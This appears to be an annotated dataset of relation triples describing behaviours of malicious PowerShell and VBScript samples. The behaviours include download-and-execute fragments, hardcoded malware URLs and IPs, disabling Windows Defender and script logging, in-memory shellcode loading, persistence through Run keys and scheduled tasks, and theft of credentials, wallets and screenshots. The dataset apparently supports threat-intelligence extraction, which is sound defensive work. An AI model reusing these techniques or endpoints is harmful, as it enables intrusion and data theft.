+The script	SUB	Download	http://192WSEDRFGTYHUJIK227WSEDRFGTYHUJIK225WSEDRFGTYHUJIK184/fdgfdsWSEDRFGTYHUJIKtxt	FILE
+http://192WSEDRFGTYHUJIK227WSEDRFGTYHUJIK225WSEDRFGTYHUJIK184/fdgfdsWSEDRFGTYHUJIKtxt	FILE	Have Name	192WSEDRFGTYHUJIK227WSEDRFGTYHUJIK225WSEDRFGTYHUJIK184/fdgfdsWSEDRFGTYHUJIKtxt	RANDOM STRING
+The script	SUB	Write	VBScript files	EXE
+CreateThread	WAPI	CalledWith	lpThreadId: 0	lpThreadId PARAMETER
+obfuscated byte array aiYLcwaq	OBF	Is	shellcode	SHELLCODE
+The script	SUB	Execute	obfuscated code	OBF COMMANd
+text file	FILE	Have	email	PVI
+The script	SUB	Download	helper2.exe	EXE
+The script	SUB	Use	Start-Sleep	SLEEP
+Base64 Encoded String	OBF	Decode	decoded string	DATA
+shortcut	FILE	Set	run on system startup	AutoRun
+The script	SUB	Execute	contents of Report.ps1	EXE
+The script	SUB	Execute	ipconfig /flushdns	ipconfig COMMAND
+The script	SUB	Connect	hotenovember.blogspot.com/	URL
+The script	SUB	Download	file from a remote server	FILE
+The script	SUB	Download	mega.zip	COMPRESSED FILE
+The script	SUB	Modify	registry for startup folder	STARTUP FOLDER REGKEY
+dischat function	FUNCTION	Send	clipboard content	PVI
+The script	SUB	Display	pop-up window	POPUP WINDOW
+The script	SUB	Download	http://198.23.212.192/inv/oil.exe	EXE
+The script	SUB	Execute	u.exe	EXE
+The script	SUB	Use	Invoke-RestMethod	Invoke-RestMethod COMMAND
+The script	SUB	Use	VirtualAlloc Function	WAPI
+HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging	REGKEY	Associted	Script Block Logging	Script Block Logging
+The script	SUB	Create	scheduled task "Data"	TASK
+The script	SUB	OBF	base64 encoding	OBF
+specific byte sequence	DATA	Have	x86 assembly sequence	ASSEMBLY
+Invoke-WebRequest	Web Request COMMAND	Download	a file	FILE
+Obfuscated code	OBF	Use	LONG_BYTE_SEQUENCE	OBF
+delegate	DELEGATE	ReferTo	VirtualAlloc function	WAPI
+The script	SUB	Modify	custom cookie header	COOKIE
+The script	SUB	Execute	IEX cmdlet	COMMAND
+The script	SUB	Create	zip file	COMPRESSED FILE
+The script	SUB	Change	files	FILE
+Obfuscation techniques	OBF	Include	Character array manipulation	Character array manipulation
+The script	SUB	Create	System.Net.WebClient	System.Net.WebClient OBJ
+VBScript	EXE	Execute	1.bat	EXE
+Loader.vbs	EXE	Execute	PowerShell command	PS COMMAND
+decoded string	DATA	PassedTo	Load method	FUNCTION
+The script	SUB	Contain	large byte array	OBF
+The script	SUB	Create	Cotrl.vbs	EXE
+The script	SUB	Use	-NoProfile and -ExecutionPolicy Bypass	BYPASS PARAMETER
+The script	SUB	Use	while loop	LOOP
+The script	SUB	Access	aspnet_compiler.exe	EXE
+The script	SUB	Retrieve	variable value	DATA
+The address of GetModuleHandleA	ADDRESS of Function	CopiedTo	byte sequence	DATA
+The script	SUB	Copy	specific files containing sensitive information	PVI
+The script	SUB	Collect	computer name	PVI
+The script	SUB	Create	delegate for function pointer	DELEGATE
+The script	SUB	Send	email with keylogger results	PVI
+The script	SUB	Dencrypt	base64 string	OBF
+The script	SUB	Encode	a list of numbers shifted by 647	OBF
+The script	SUB	Use	registry key	REGKEY
+The script	SUB	Use	non-standard ports	NON-STANDARD PORT
+The script	SUB	Create	WebClient object	WEBCLIENT
+log.vbs	EXE	Hosted	hidden directory	HIDDEN PATH
+The script	SUB	Use	XOR encryption	OBF
+AddVectoredExceptionHandler	WAPI	SET	Exception handling	ERR
+$KEZ	VAR	Encoded By	-replace '', ''	REPLACE PARAMETER
+helper2.exe	EXE	Hosted	https://mayanboats.com/wp-content/uploads/	URL
+assembly codes from byte array	ASSEMBLY	Execute	method from it	FUNCTION
+The script	SUB	Execute	7-second sleep 	SLEEP
+The script	SUB	Have	obfuscated class and method names	OBF
+a file	FILE	Hosted	an external URL	URL
+The script	SUB	Execute	code from memory	CODE
+The script	SUB	Load	WindowsBase assembly	WindowsBase assembly WAPI
+The script	SUB	Connect	external source	EXTERNAL SERVICE
+The script	SUB	Exfiltrate	sensitive data	PVI
+The script	SUB	Use	Interop Services	Interop SERVICE
+The script	SUB	Remove	the decrypted data starts with the Unicode Byte Order Mark (BOM)	DATA
+the decrypted data starts with the Unicode Byte Order Mark (BOM)	DATA	StartWith	The Unicode Byte Order Mark	BOM
+the decrypted	DATA	OrderBy	 the Unicode Byte Order Mark (BOM)	BOM		
+The script	SUB	Spoof	Host and User-Agent	HTTP_HEADERS
+The script	SUB	Execute	ReturnShellAlosh	CUSTOMIZED FUNCTION
+SmartScreenEnabled	REGKEY	Access	Windows Defender	DEFENDER
+The script	SUB	Check	pointer size	POINTER SIZE
+The script	SUB	Load	CreateThread	WAPI
+The script	SUB	Connect	http://23.227.202.198:443	URL
+The script	SUB	Download	http://135.125.248.37/Server1.txt	FILE
+The script	SUB	Write	%appdata%\Microsoft\Windows\Templates\Pages_Elements.xml	FILE
+The script	SUB	Encrypt	ASCII characters and base64 encoded strings	OBF
+The script	SUB	Execute	a file	EXE
+long byte sequences	OBF	Have	certain substrings	PARAMETER
+The script	SUB	Execute	Invoke-Expression $cc	IEX COMMAND
+The script	SUB	Use	obfuscated variable names and strings	OBF
+batch file (1.bat)	EXE	Execute	PowerShell script (Nothing.ps1)	PS COMMAND
+The script	SUB	Check	the presence of 'HttpDebuggerSdk' driver	DRIVER
+script	SUB	Connect	Telegram bot	EXTERNAL SERVICE
+Telegram bot	EXTERNAL SERVICE	Is	bot	BOT
+The script	SUB	Gets address of	VirtualAlloc	ADDRESS OF FUNCTION
+markov.exe	EXE	Have	payload.bin	ARGUMENT
+payload.bin	ARGUMENT	Is	bin	EXE
+The script	SUB	Create	C:/nkll/	PATH
+The script	SUB	Retrieve	first decoded string	DATA
+'Run.BAT'	EXE	Hosted	'C:\Users\Public\Run'	PATH
+The script	SUB	Use	CreateThread	WAPI
+Telegram bot	BOT	Contact	specific chat group	CHAT GROUP
+The script	SUB	Create	README.txt	FILE
+The script	SUB	Write	khle.mp3	FILE
+MINGALIES	PATH	Hosted	The script	SUB
+the script	SUB	Set	$ErrorActionPreference='stop'	ErrorActionPreference PARAMETER
+The script	SUB	Delete	related files	FILE
+startup entries	AutoRun REGKEY	Hosted	HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders	REGKEY
+The script	SUB	Collect	user name	PVI
+shellcode	EXE	Use	CallWindowProc	CallWindowProc WAPI
+The script	SUB	Use	Sleep commands	SLEEP
+The script	SUB	Execute	IO.Compression.GzipStream	COMPRESSION WAPI
+The script	SUB	Create	'New.vbs'	EXE
+The script	SUB	Defines	$EfuUwoMuEly	PARAMETER
+The script	SUB	Wait	server closes connection	CONDITION
+PowerShell command	PS COMMAND	Decode	base64 string	OBF
+TravellingPositions_nopump.exe	EXE	Saved	a directory in the user's APPDATA folder	USER APPDATA PATH
+The script	SUB	Have	while ($true)	LOOP
+The script	SUB	Execute	EntryPoint	ENTRYPOINT TO EXE
+script	SUB	Download	\\172.96.161.208@8080\DavWWWRoot\payload.zip	URL
+The script	SUB	Create	fake file	FAKE FILE
+The script	SUB	Create	directories and files	FILE
+Wallpaper	WALLPAPER	ChangedTo	a custom image	CUSTOMIZED IMG
+Sneaky.toooyou	FUNCTION	Is	Obfuscated	OBF
+the script	SUB	Use	obfuscated code	OBF
+screenshots	PVI	UploadedTo	Dropbox account	EXTERNAL SERVICE
+The script	SUB	Execute	VirtualAlloc	WAPI
+The script	SUB	Execute	received commands	COMMAND
+WD.bat	EXE	Execute	WD.PS1	EXE
+The script	SUB	Write	x.ps1	EXE
+obfuscation techniques	OBF	Include	string manipulation	OBF
+$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture.png	FILE	SentTo	Dropbox	EXTERNAL SERVICE
+$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture.png	FILE	Hosted	userprofile appdata path	USERPROFILE APPDATA PATH
+function `dischat`	FUNCTION	Send	clipboard content	PVI
+cmd.exe	EXE	Have	/C	/C PARAMETER
+The script	SUB	Have	$YSJXX	OBF
+Add-Type cmdlet	COMMAND	Load	System.Windows.Forms	System.Windows.Forms LIBRARY
+Decrypted byte sequence	OBF	Hosted	Memory	MEMORY
+The script	SUB	Execute	unknown code	CODE
+The script	SUB	Create	HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run	AutoRun REGKEY
+Obfuscation techniques	OBF	Include	String concatenation	String concatenation ACTION
+The script	SUB	Write	XX.bat	EXE
+The script	SUB	Execute	Start-Sleep	SLEEP
+The script	SUB	Use	obfuscated strings	OBF
+The script	SUB	Use	obfuscated variable names	OBF
+The script	SUB	Collect	current user	PVI
+start-job	Start-Job COMMAND	Have	parameter -RunAs32	RunAs32 PARAMETER
+The script	SUB	Have	-ep bypass	BYPASS PARAMETER
+CDGXDSRESFUDZIFORNSEKR	FUNCTION	Decode	long byte sequence	OBF
+JSON files	FILE	CompressedTo	Zip file	COMPRESSED FILE
+Insidious.exe	EXE	Hosted	Discord's CDN	URL
+The script	SUB	Create	VBScript file WD.vbs	EXE
+executable files	EXE	Renamed	files with random names	FILE
+files with random names	FILE	Have Name	random string	RANDOM STRING
+Set-MpPreference	Set-MpPreference COMMAND	Use	-DisableRealtimeMonitoring	DisableRealtimeMonitoring PARAMETER
+Run.BAT	EXE	Have	PowerShell command	PS COMMAND
+The script	SUB	Execute	contents of C:\ProgramData\Document\x.ps1	EXE
+$ErrorActionPreference	PARAMETER	SetTo	silentlycontinue	silentlycontinue
+The script	SUB	Create	hidden directory	HIDDEN PATH
+The script	SUB	Split	a long byte sequence	DATA
+The script	SUB	Write	.bat	EXE
+The script	SUB	Use	system web proxy	NETWORK_PROXY
+New.vbs	EXE	Hosted	C:\Users\Public\Run	PATH
+files	FILE	UploadedTo	Dropbox	EXTERNAL SERVICE
+The script	SUB	Connect	cdn35.space	EXTERNAL SERVICE
+The script	SUB	Disable	Signature Updates on Startup	SYSTEM UPDATE
+The script	SUB	Use	System.Text.Encoding.UTF8.GetString	System.Text.Encoding.UTF8.GetString COMMAND
+The script	SUB	Execute	VsLabs.vbs	EXE
+script	SUB	Use	kernel32.dll	DLL
+UDXTFLCBTPDTCSEPOVHLIZ	CUSTOMIZED FUNCTION	Use	Invoke-Expression	IEX COMMAND
+The script	SUB	Drop	bat files	EXE
+powershell.exe	EXE	Hosted	remote location	URL
+CreateThread	WAPI	Create	new thread	THREAD
+HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run	AutoRun REGKEY	Have	socks	SOCKS
+The script	SUB	Decode	Base64 Encoded String	OBF
+System.Convert.ToInt32	COMMAND	Decrypt	Base64 Strings	OBF
+The script	SUB	Execute	code	CODE
+TBFLVIISWLYQJRIYEDPLGO.ps1	EXE	Have	Obfuscated Code	OBF
+byte array $Ghost	DATA	PassedTo	executed assembly	ASSEMBLY
+$bbb	VAR	Generated From	$UJDSS	VAR
+The script	SUB	Create	'YWGCNHBTTYGDVSHYYNDAIO.vbs'	FILE
+infinite loop	LOOP	Breaks On	network connection loss	EVENT
+The script	SUB	Create	shortcut to executable	SHORTCUT
+shortcut to executable	SHORTCUT	ReferTo	executable	EXE
+remote script	EXE	Download	hxxp://example.com/script2.ps1	URL
+The script	SUB	Execute	infinite loop	LOOP
+The script	SUB	Have	-W Hidden	BYPASS PARAMETER
+The script	SUB	Use	Command-Line Arguments	Command-Line Argument PARAMETER
+script	SUB	Ignore	errors	ERROR_MSG
+Get-WmiObject	COMMAND	Collect	installed antivirus software	PVI
+the script	SUB	Decode	XXVTXC function	OBF
+The script	SUB	Create	HKCU:\Software\FileZillaClient\	REGKEY
+WD.bat	EXE	Use	-ExecutionPolicy Bypass	BYPASS  PARAMETER
+data	FILE	Saved	notepad.exe	EXE
+The script	SUB	Use	CreateThread	WAPI
+process ID	PID	Saved	a temporary file	TEMP FILE
+FolConsoLsd function	FUNCTION	Is	empty	EMPTY
+script	SUB	Have	try-catch block	ERROR_HANDLING
+CreateThread	WAPI	Create	thread	THREAD
+the size of IntPtr	POINTER SIZE	CHECK	32-bit or 64-bit process	TYPE OF PROCESS
+The script	SUB	Download	Updater.exe	EXE
+The script	SUB	Execute	Marshal.Copy	WAPI
+PowerShell	PS COMMAND	Have	-ExecutionPolicy Bypass	BYPASS PARAMETER
+The script	SUB	Load	GetThreadContext	WAPI
+The script	SUB	Have	-nop	PARAMETER
+The script	SUB	Decode	Base64 strings	OBF
+The script	SUB	Decode	$y74gh00rffd	OBF
+The script	SUB	Use	complex and obfuscated code	OBF
+The script	SUB	Have	$hnzVudhxc	OBF
+Base64 Encoded Payload	OBF	SavedTo	.BAT file	EXE
+The script	SUB	Write	WD.PS1	EXE
+https://finalsteptogo.com/uploads/tr9.txt	FILE	HOSTED	https://finalsteptogo.com/uploads/tr9.txt	URL
+The script	SUB	Have	XOR Encryption	OBF
+Insidious.exe	EXE	Have	.mp3	DATA
+words.txt	FILE	SavedTo	AppData directory	PATH
+the script	SUB	Execute	$screens.Bounds	FUNCTION
+The script	SUB	Execute	keylogger functionality	COMMAND
+IEX	COMMAND	Have	-ExecutionPolicy Bypass	PARAMETER
+The script	SUB	Extract	data	DATA
+The script	SUB	Download	peltgon.zip	COMPRESSED FILE
+The script	SUB	Disable	Privacy Mode	Privacy Mode
+The script	SUB	Use	System.IO.StreamReader	System.IO.StreamReader WAPI
+PowerShell	PS COMMAND	Load	.NET Framework's aspnet_compiler.exe	EXE
+The script	SUB	Connect	a remote server	REMOTE HOST
+wallet files for cryptocurrency clients	CRYPTOCURRENCY INFO	Hosted	 cryptocurrency clients (Telegram, Exodus, Electrum, Monero)	CRYPTOCURRENCY PATH
+The script	SUB	Decrypt	hidden payload	OBF
+The script	SUB	Add Exclusion	several processes and directories	PROCESS
+The script	SUB	Write	PowerShell script (Document.ps1)	EXE
+decoded PowerShell script	SUB	Connect	remote server	REMOTE HOST
+The script	SUB	EXECUTE	commands	COMMAND
+The script	SUB	Have	Base64 Encoded String	OBF
+memory protection level	MEMORY PROTECTION	SetTo	0x40	VALUE
+Loader.bat	EXE	Execute	Loader.vbs	EXE
+The script	SUB	Use	PowerShell Empire	PENTEST TOOL
+The script	SUB	Disable	Windows Defender real-time protection	DEFENDER
+The script	SUB	Collect	Group membership	PVI
+decrypted byte sequence	DATA	Loaded	memory allocated by VirtualAlloc	MEMORY
+the script	SUB	Connect	rick63.publicvm.com	URL
+The script	SUB	Have	Base64 Encoded Strings	OBF
+1.exe	EXE	Hosted	hxxp://185.244.14.184/1.exe	URL
+$aa	OBF	Have	PowerShell command	PS COMMAND
+script	SUB	Clear	clipboard	PVI
+startup entries	AutoRun REGKEY	Hosted	HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders	REGKEY
+The script	SUB	Have	reverse or bind TCP connection	REVERSE/BIND TCP
+access token	TOKEN	Have	hardcoded Dropbox API credentials ($r, $u, $p)	CREDENTIAL
+The script	SUB	Collect	Remote desktop users	PVI
+The script	SUB	Execute	powershell.exe -eC	PS COMMAND
+powershell.exe -eC	PS COMMAND	Have	-eC	-eC PARAMETER
+The script	SUB	Execute	method $o.Invoke($hh, ($Z,$bytes2))	METHOD
+Run.vbs	EXE	Hosted	public user directory	PUBLIC PATH
+The script	SUB	Execute	remote script	REMOTE CODE
+Irs Tax Status.pdf	FILE	Hosted	htn8v6pprexbssplayy.com/dexbcoy.pdf	URL
+The script	SUB	Create	scheduled task (mvfp)	TASK
+The script	SUB	Create	list of strings	DATA
+The script	SUB	Define	asceeeeeeeeeeeeeeeeee	CUSTOMIZED FUNCTION
+The script	SUB	Execute	WebClient object	WebClient Object
+The script	SUB	Execute	max.exe	EXE
+The script	SUB	Use	Base64 encoding	OBF
+login data file	FILE	Saved	temporary location	TEMP PATH
+The script	SUB	Create	$CC	FILE
+$CC	FILE	Have Name	Random string	RANDOM STRING
+The script	SUB	Download	mezzanines.dll	DLL
+WKDXIRNNHFHKNAFGOARGSL.vbs	EXE	Create	new process	PROCESS
+libraries.ps1	EXE	Saved	C:\Users\Public	PUBLIC PATH
+Decoded string	DATA	Execute	iex((New-Object System.Net.WebClient).DownloadString	IEX COMMAND
+iex((New-Object System.Net.WebClient).DownloadString	IEX COMMAND	Download	file	FILE
+The script	SUB	Use	Add-Type cmdlet	Add-Type cmdlet COMMAND
+The script	SUB	Create	directory in user's AppData\Roaming folder	USER APPDATA PATH
+VsLabs.vbs	EXE	Execute	VsEnhance.bat	EXE
+The script	SUB	Create	runspace pool	RUNSPACE POOL
+Marshal.Copy	Marshal.Copy WAPI	Copy	byte array	DATA
+The script	SUB	Create	scheduled task 'PDF'	TASK
+GitHub repository	URL	Host	'ngrok.exe'	EXE
+PowerShell version >= 5.1	Powershell version	DISABLE	Script Block Logging	SBL
+oghygb4	FUNCTION	Use	XOR Cipher	ENCRYPTION ALGORITHM
+The script	SUB	Execute	Updater.exe	EXE
